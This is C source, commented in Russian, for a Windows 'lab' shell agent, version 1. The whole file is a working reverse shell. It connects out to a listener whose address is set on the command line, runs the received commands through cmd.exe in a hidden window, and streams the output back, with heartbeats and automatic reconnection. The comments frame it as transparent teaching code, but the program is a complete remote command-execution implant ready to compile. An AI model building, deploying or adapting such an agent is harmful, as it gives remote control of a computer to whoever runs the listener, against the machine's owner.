/* lab-agent.c — учебный shell-агент v1 (лаборатория, прозрачный)
 *
 * Что нового в v1 (каждый пункт — урок слоя ОС, которого не было в v0):
 *  1. LENGTH-PREFIX ФРЕЙМИНГ вместо построчного протокола. Урок: sentinel-строка
 *     ломается, когда бинарный вывод команды содержит её саму; длина перед
 *     данными — классическое решение (TCP это просто байтовый поток).
 *  2. HEARTBEAT: поток-пингер раз в 5с присылает служебный фрейм PING.
 *     Урок: один сокет — два вида трафика; разделяем их полем type в заголовке.
 *  3. RECONNECT с exponential backoff + jitter. Урок v0 был: оператор закрыл
 *     сокет -> агент умирает. Теперь агент живёт и догоняет слушателя обратно.
 *  4. JOB OBJECT: команда "start notepad" создаёт внука, дед жив — а в v0
 *     открытый наследованный пайп внука держал канал до его смерти. Решение:
 *     ребёнка кладём в Job с JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE.
 *  5. Задание протокола: <u32 magic "BA01"> <u32 type> <u32 length> <payload>.
 *     type: 1=CMD, 2=OUT, 3=END (payload=exitcode ascii), 4=PING.
 *
 * Всё видно: имя процесса честное, каждая команда печатается в его консоль,
 * завершение — команда exit либо Ctrl+C / taskkill. Никакой маскировки.
 *
 * Сборка: gcc -O2 -o lab-agent.exe lab-agent.c -lws2_32
 */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAGIC       0x31414142u   /* "BA01" little-endian: 'BA01' */
#define T_CMD       1u
#define T_OUT       2u
#define T_END       3u
#define T_PING      4u
#define HDR_LEN     12u
#define RECV_TIMEOUT_MS 15000     /* детект мёртвого линка без данных */

static SOCKET g_sock = INVALID_SOCKET;
static CRITICAL_SECTION g_send_lock;   /* сериализует send'ы: вывод команды и heartbeat */
static volatile LONG g_sock_live = 0;  /* 1 = по g_sock можно слать */

static void send_frame_raw(unsigned type, const char *payload, unsigned len) {
    if (!InterlockedCompareExchange(&g_sock_live, 0, 0)) return; /* между сессиями молчим */
    unsigned char hdr[HDR_LEN];
    unsigned magic = MAGIC;
    memcpy(hdr + 0, &magic, 4);
    memcpy(hdr + 4, &type, 4);
    memcpy(hdr + 8, &len, 4);
    EnterCriticalSection(&g_send_lock);
    int off = 0, total = HDR_LEN;
    while (off < total) {
        int w = send(g_sock, (char *)hdr + off, total - off, 0);
        if (w == SOCKET_ERROR) break;
        off += w;
    }
    off = 0;
    while (off < (int)len) {
        int w = send(g_sock, payload + off, len - off, 0);
        if (w == SOCKET_ERROR) break;
        off += w;
    }
    LeaveCriticalSection(&g_send_lock);
}

static int recv_full(char *buf, unsigned need) {
    unsigned got = 0;
    while (got < need) {
        int r = recv(g_sock, buf + got, need - got, 0);
        if (r == 0 || r == SOCKET_ERROR) return 0;
        got += (unsigned)r;
    }
    return 1;
}

/* ждёт CMD-фрейм; PING-фреймы отвечают эхом; обрыв -> 0 */
static int wait_cmd(char **out, unsigned *outlen) {
    unsigned char hdr[HDR_LEN];
    for (;;) {
        if (!recv_full((char *)hdr, HDR_LEN)) {
            printf("[lab-agent] recv hdr fail: WSAerr=%d\n", WSAGetLastError());
            fflush(stdout);
            return 0;
        }
        unsigned magic, type, len;
        memcpy(&magic, hdr + 0, 4);
        memcpy(&type,  hdr + 4, 4);
        memcpy(&len,   hdr + 8, 4);
        if (magic != MAGIC) {
            printf("[lab-agent] битый magic=%08x — линк сломан\n", magic);
            fflush(stdout);
            return 0;
        }
        if (len > (64u << 20)) { printf("[lab-agent] гигантский фрейм — обрываем\n"); fflush(stdout); return 0; }
        if (type == T_PING) {
            /* ЛОВУШКА: payload кадра ОБЯЗАН быть вычитан до ответа, иначе
             * его байты ("ping") склеятся со следующим заголовком и парсер
             * увидит битый magic (ловили на e2e: heartbeat+echo=reset). */
            char pl[64];
            if (len) {
                if (len > sizeof pl) { printf("[lab-agent] PING len=%u слишком большой\n", len); fflush(stdout); return 0; }
                if (!recv_full(pl, len)) {
                    printf("[lab-agent] recv ping payload fail: WSAerr=%d\n", WSAGetLastError());
                    fflush(stdout);
                    return 0;
                }
            }
            printf("[lab-agent] got PING, отвечаю pong\n");
            fflush(stdout);
            send_frame_raw(T_PING, "pong", 4);
            continue;
        }
        if (type == T_CMD) {
            char *buf = (char *)malloc(len + 1);
            if (!buf) return 0;
            if (len && !recv_full(buf, len)) {
                printf("[lab-agent] recv payload fail: WSAerr=%d\n", WSAGetLastError());
                fflush(stdout);
                free(buf);
                return 0;
            }
            buf[len] = '\0';
            *out = buf; *outlen = len;
            return 1;
        }
        printf("[lab-agent] неожиданный тип фрейма %u\n", type);
        fflush(stdout);
        return 0;
    }
}

/* ── exec-модуль: cmd.exe /c с перекачкой вывода в OUT-фреймы ── */
static void run_command(const char *line, unsigned nlen) {
    /* Job Object: внуки команды умирают вместе с cmd.exe (урок v0) */
    HANDLE job = CreateJobObjectW(NULL, NULL);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jl;
        memset(&jl, 0, sizeof jl);
        jl.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, &jl, sizeof jl);
    }

    SECURITY_ATTRIBUTES sa = { sizeof sa, NULL, TRUE };
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        const char *msg = "pipe_err";
        send_frame_raw(T_END, msg, (unsigned)strlen(msg));
        if (job) CloseHandle(job);
        return;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    wchar_t wcmd[16384];
    /* команда приходит от оператора в UTF-8; собираем "cmd.exe /c <cmd>" */
    char final[16400];
    if (nlen >= sizeof final - 16) nlen = sizeof final - 16;
    memcpy(final, "cmd.exe /c ", 11);
    memcpy(final + 11, line, nlen);
    final[11 + nlen] = '\0';
    MultiByteToWideChar(CP_UTF8, 0, final, -1, wcmd, 16384);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si);
    memset(&pi, 0, sizeof pi);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = NULL;
    si.hStdOutput = wr;
    si.hStdError  = wr;

    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(wr);   /* критично: иначе ReadFile никогда не увидит EOF */
    if (!ok) {
        DWORD e = GetLastError();
        char msg[64];
        int m = snprintf(msg, sizeof msg, "createprocess_%lu", (unsigned long)e);
        send_frame_raw(T_END, msg, (unsigned)m);
        CloseHandle(rd);
        if (job) CloseHandle(job);
        return;
    }
    if (job) AssignProcessToJobObject(job, pi.hProcess);

    /* ── перекачка вывода. Урок: EOF по пайпу наступает только когда ВСЕ
     * держатели write-конца мертвы; внук от "start ..." наследует хэндл и
     * держит канал (так висела v0). Поэтому на EOF не надеемся: поллим
     * Peek+Wait, смерть ребёнка = конец команды, внуков добивает job. */
    char buf[65536];
    DWORD got = 0;
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            DWORD want = avail < sizeof buf ? avail : sizeof buf;
            if (!ReadFile(rd, buf, want, &got, NULL) || got == 0) break;
            send_frame_raw(T_OUT, buf, got);
            continue;
        }
        if (WaitForSingleObject(pi.hProcess, 200) == WAIT_OBJECT_0) {
            /* ребёнок умер: дочитываем буферизованный хвост и выходим */
            for (;;) {
                DWORD rest = 0;
                if (!PeekNamedPipe(rd, NULL, 0, NULL, &rest, NULL) || rest == 0) break;
                DWORD want2 = rest < sizeof buf ? rest : sizeof buf;
                if (!ReadFile(rd, buf, want2, &got, NULL) || got == 0) break;
                send_frame_raw(T_OUT, buf, got);
            }
            break;
        }
    }
    CloseHandle(rd);

    WaitForSingleObject(pi.hProcess, 5000); /* почти всегда уже мёртв */
    DWORD exitcode = 0;
    GetExitCodeProcess(pi.hProcess, &exitcode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    /* job закрываем только ПОСЛЕ завершения ребёнка: пока хэндл жив,
       kill-on-job-close не срабатывает; закрыли — внуки гарантированно мертвы */
    if (job) CloseHandle(job);
    char tail[48];
    int t = snprintf(tail, sizeof tail, "%lu", (unsigned long)exitcode);
    send_frame_raw(T_END, tail, (unsigned)t);
}

/* ── heartbeat-поток: раз в 5с шлёт PING; гасится event'ом при обрыве ── */
static HANDLE g_hb_stop = NULL;

static DWORD WINAPI heartbeat(LPVOID arg) {
    (void)arg;
    for (;;) {
        if (g_hb_stop == NULL) { Sleep(5000); continue; }  /* страховка от CreateEventW=NULL */
        DWORD w = WaitForSingleObject(g_hb_stop, 5000);
        if (w == WAIT_OBJECT_0) return 0;   /* сессия кончилась — уходим */
        send_frame_raw(T_PING, "ping", 4);
    }
}

static int agent_session(const char *host, unsigned short port) {
    WSADATA wsa;
    InitializeCriticalSection(&g_send_lock);
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[lab-agent] WSAStartup failed\n");
        return 1;
    }

    int attempt = 0;
    for (;;) {
        /* exponential backoff + jitter (детерминированный xorshift) */
        unsigned delay_ms = attempt == 0 ? 0 : (500u << (attempt - 1));
        if (delay_ms > 30000u) delay_ms = 30000u;
        static unsigned rng = 0x1234567u;
        rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
        delay_ms = delay_ms ? delay_ms / 2 + rng % (delay_ms / 2 + 1) : 0;
        if (delay_ms) {
            printf("[lab-agent] reconnect #%d через %ums\n", attempt, delay_ms);
            Sleep(delay_ms);
        }

        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { fprintf(stderr, "[lab-agent] socket failed err=%d\n", WSAGetLastError()); return 1; }

        /* recv-timeout: если 15с ни одного байта (ни PING, ни CMD) — линк мёртв */
        DWORD tmo = RECV_TIMEOUT_MS;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&tmo, sizeof tmo);

        struct sockaddr_in a;
        memset(&a, 0, sizeof a);
        a.sin_family = AF_INET;
        a.sin_port = htons(port);
        if (inet_pton(AF_INET, host, &a.sin_addr) != 1) {
            fprintf(stderr, "[lab-agent] bad host: %s\n", host);
            return 1;
        }
        printf("[lab-agent] connect %s:%u ... (процесс виден в диспетчере задач)\n", host, port);
        if (connect(s, (struct sockaddr *)&a, sizeof a) != 0) {
            printf("[lab-agent] не подключились (err=%d)\n", WSAGetLastError());
            closesocket(s);
            if (attempt < 6) attempt++;
            continue;
        }

        g_sock = s;
        InterlockedExchange(&g_sock_live, 1);
        attempt = 0;
        printf("[lab-agent] online -> %s:%u\n", host, port);

        g_hb_stop = CreateEventW(NULL, TRUE, FALSE, NULL);
        HANDLE hb = CreateThread(NULL, 0, heartbeat, NULL, 0, NULL);

        for (;;) {
            char *cmd = NULL;
            unsigned clen = 0;
            if (!wait_cmd(&cmd, &clen)) {
                printf("[lab-agent] линк потерян (timeout/обрыв) — переподключаемся\n");
                break;
            }
            printf("[lab-agent] cmd (%u bytes): %s\n", clen, cmd);
            if (clen == 4 && memcmp(cmd, "exit", 4) == 0) {
                send_frame_raw(T_END, "exit", 4);
                free(cmd);
                SetEvent(g_hb_stop);
                WaitForSingleObject(hb, 2000);
                CloseHandle(hb);
                CloseHandle(g_hb_stop);
                g_hb_stop = NULL;
                InterlockedExchange(&g_sock_live, 0);
                closesocket(s);
                WSACleanup();
                printf("[lab-agent] stopped (exit от оператора)\n");
                return 0;
            }
            run_command(cmd, clen);
            free(cmd);
        }
        SetEvent(g_hb_stop);            /* сигнал heartbeat'у на выход */
        WaitForSingleObject(hb, 2000);  /* ждём реального завершения потока */
        CloseHandle(hb);
        CloseHandle(g_hb_stop);
        g_hb_stop = NULL;
        InterlockedExchange(&g_sock_live, 0);
        closesocket(s);
        g_sock = INVALID_SOCKET;
        if (attempt < 6) attempt++;
    }
}

int main(int argc, char **argv) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    unsigned short port = (unsigned short)(argc > 2 ? atoi(argv[2]) : 4444);
    setvbuf(stdout, NULL, _IONBF, 0);   /* лог не теряется при kill (диагностика) */
    int rc = agent_session(host, port);
    return rc;
}
